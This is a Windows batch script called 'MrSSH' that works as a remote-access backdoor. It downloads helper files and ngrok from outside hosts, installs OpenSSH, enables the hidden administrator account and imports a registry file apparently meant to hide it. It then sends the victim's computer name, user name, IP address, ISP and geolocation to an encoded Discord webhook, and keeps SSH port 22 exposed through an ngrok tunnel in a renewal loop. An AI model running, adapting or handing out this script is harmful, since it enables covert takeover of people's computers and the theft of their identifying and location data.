@echo off
setlocal enabledelayedexpansion
pushd %temp%

:: <Variables>
set "Version=1.0"
set "DefaultToken=dheb"
set Files=Hex.bat NgrokRun.bat OpenSSH.ps1 SilentCMD.exe Source.bat hide.reg WebParse.exe
set Github=https://github.com/dh3b/MrSSH/raw/main/Files/
set "Folder=%temp%\Files"
:: </Variables>

:: <Install>
Rem download ngrok anyway, because it often bugs
curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "!Folder!\ngrok.zip"

for %%a in (!Files!) do if not exist "!temp!\Files\%%a" set /a MissingFiles+=1

if !MissingFiles! geq 1 (
    for %%a in (!Files!) do (
        set /a Downloaded+=1
        curl --create-dirs -f#kLo "!temp!\Files\%%a" "!DefaultGateway!/%%a"
    )
)

pushd !Files!
:: </Install>

powershell ./OpenSSH.ps1

net user administrator /active:yes
reg import "!Folder!\hide.reg"

:: <Set webhook>
curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
set "hexwebhook=%hexwebhook:~-244%"
FOR /F "tokens=* USEBACKQ" %%F IN (`call hex.bat -hex "%hexwebhook%"`) DO (SET webhook=%%F)
:: </Set webhook>


for /f "tokens=*" %%a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%%a"

call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"

mkdir log
tar -xf ngrok.zip

:: <Start Ngrok>
start /B "copy" silentcmd xcopy /h /Y ngrok.log !Files!\log\ /DELAY:10
start /B "discordmsg" silentcmd !Files!\NgrokRun.bat /DELAY:10
start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
:: </Start Ngrok>

:: <Restart Loop>
:ngrokloop
call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
start /B "copy" silentcmd xcopy /h /Y ngrok.log !Files!\log\ /DELAY:10
start /B "discordmsg" silentcmd !Files!\NgrokRun.bat /DELAY:10
start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
goto ngrokloop
:: </Restart Loop>
